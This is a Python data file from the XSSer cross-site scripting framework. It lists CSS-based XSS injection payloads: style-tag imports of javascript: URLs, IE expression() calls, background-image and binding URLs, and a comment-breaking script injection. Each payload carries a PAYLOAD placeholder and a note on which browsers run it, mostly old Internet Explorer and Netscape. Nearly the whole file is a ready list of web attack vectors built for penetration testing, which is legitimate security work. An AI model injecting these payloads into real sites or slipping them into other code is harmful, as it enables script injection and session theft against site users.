"""
$Id$

This file is part of the xsser project, http://xsser.sourceforge.net.

Copyright (c) 2011/2012/2013/2014/2015 - <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
## This file contains different CSS fuzzing vectors to inject in payloads and browser supports.
## If you have some new vectors, please email me to [epsylon@riseup.net] and will be added to XSSer framework.
## Thats all.
###
## Happy Cross Hacking! ;)
vectors_css = [ { 'payload':"""<style>*{background:red;}</style>""",
                  'browser':"""All browsers support"""},
                { 'payload':"""<style>*{font-size: 30px;}</style>}""",
		  'browser':"""All browsers support"""},
		{ 'payload':"""<STYLE>@im\port'\ja\vasc\ript:alert("XSSer")';</STYLE>""",
		  'browser':"""All browsers support"""},
		{ 'payload':"""<IMG STYLE="xss:expr/*XSS*/ession(alert('XSSer'))">""",
		  'browser':"""All browsers support"""},
		{ 'payload':"""<DIV STYLE="background-image: url(&#1;PAYLOAD)">""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},
	  	{ 'payload':"""<DIV STYLE="width: expression(PAYLOAD);">""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},
	        { 'payload':"""<IMG STYLE="xss:expr/*XSS*/ession(PAYLOAD)">""",
	       	  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""}, 
		{ 'payload':"""<XSS STYLE="xss:expression(PAYLOAD)">""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},			  
		{ 'payload':"""<STYLE TYPE="text/javascript">PAYLOAD</STYLE>""",
		  'browser':"""[NS4]"""},
		{ 'payload':"""<STYLE>.XSS{background-image:url("PAYLOAD");}</STYLE><A CLASS=XSS></A>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},
		{ 'payload':"""<STYLE type="text/css">BODY{background:url("PAYLOAD")}</STYLE>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""}, 		  
		{ 'payload':"""<STYLE>li {list-style-image: url("PAYLOAD</STYLE><UL><LI>XSS""", 
		  'browser':"""[IE6.0|NS8.1-IE]"""},
		{ 'payload':"""<DIV STYLE="background-image: url(&#1;javascript:PAYLOAD">""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},
		{ 'payload':"""<DIV STYLE="binding: url(javascript:PAYLOAD);">""",
	   	  'browser':"""[IE6.0|NS8.1-IE]"""},
		{ 'payload':"""<style><!--</style><SCRIPT>PAYLOAD//--></SCRIPT>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""}
] 
